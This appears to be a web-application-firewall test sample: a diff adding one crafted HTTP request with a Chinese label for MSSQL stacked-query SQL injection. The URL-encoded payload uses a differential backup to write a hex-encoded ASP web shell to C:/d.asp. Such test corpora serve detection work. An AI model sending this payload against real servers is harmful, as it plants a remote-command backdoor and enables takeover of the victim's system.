@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506399
+# 攻击者基于堆叠查询，将"backup database test to disk = 'c:/bak.bak';create table [dbo].[test] ([cmd] [image]);insert into test(cmd) values(0x3C25657865637574652872657175657374282261222929253E);backup database test to disk='C:/d.asp' WITH DIFFERENTIAL,FORMAT"语句注入到 SQL 查询参数中，进行差异备份，备份任意数据库到C盘任意文件。
+GET /?id=1%3Bbackup%20database%20test%20to%20disk%20=%20%27c:%2Fbak.bak%27%3Bcreate%20table%20%5Bdbo%5D.%5Btest%5D%20%28%5Bcmd%5D%20%5Bimage%5D%29%3Binsert%20into%20test%28cmd%29%20values%280x3C25657865637574652872657175657374282261222929253E%29%3Bbackup%20database%20test%20to%20disk=%27C:%2Fd.asp%27%20WITH%20DIFFERENTIAL%2CFORMAT&bid=hd_tag_m8mv23vx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23vx
+RM-PRO-Token: 38f4a5ab7f3e27d4bb8267b74bc296a1
+RM-PRO-Time: 1742808348324
+User-Agent: curl/7.83.1
+
